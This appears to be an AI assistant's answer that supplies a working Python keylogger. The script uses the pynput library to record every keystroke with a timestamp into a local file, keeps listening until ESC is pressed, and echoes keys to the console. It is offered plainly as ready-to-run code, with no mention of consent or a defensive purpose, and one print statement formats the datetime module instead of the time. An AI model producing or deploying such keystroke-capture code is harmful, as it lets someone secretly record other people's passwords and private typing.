Here is a Python code which listens to the keypresses and saves them into keylogs.txt. It uses the pynput library for listening to the keys and also handles exceptions, writes data to file incrementally, etc.

```python
# Importing Required Libraries
from pynput import keyboard
import datetime
import time

# File Handling: Open the log file in write mode (new or append)
try:
    key_logs = open("keylogs.txt", "a+")
except Exception as e:
    print(f'Error occurred when trying to open keylog- {e}') 
    exit(-1)  # Exit Code -1 indicates an error has occurred
 
def on_press(key):       # Function that executes on Key press   
     try:               # Try block to check for valid character
         key_logs.write(str(datetime.datetime.now())+' --> '+ str(key) + '\n')  # Write the key pressed and time it was pressed     
         print('{0} ({1})'.format(key, datetime))                            # Prints Key Press to Console
         key_logs.flush()   # Ensures data is written onto file before next write operation      
    
     except Exception as e: 
        print(f"Error occurred when trying to print keylog- {e}")  
# Function that executes on Key release
def on_release(key):    
    if key == keyboard.Key.esc:   # If ESC key is pressed, program will terminate.
        return False             
 
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:      # Listener that continuously captures keystrokes until termination key (ESC) is pressed     
    listener.join()   
 
try:                             # Try block to close file properly after operations done       
    key_logs.close()            # Close the log file         
except Exception as e:          
    print(f"Error occurred when trying to close file - {e}") # Error print, if any, while closing keylog file  
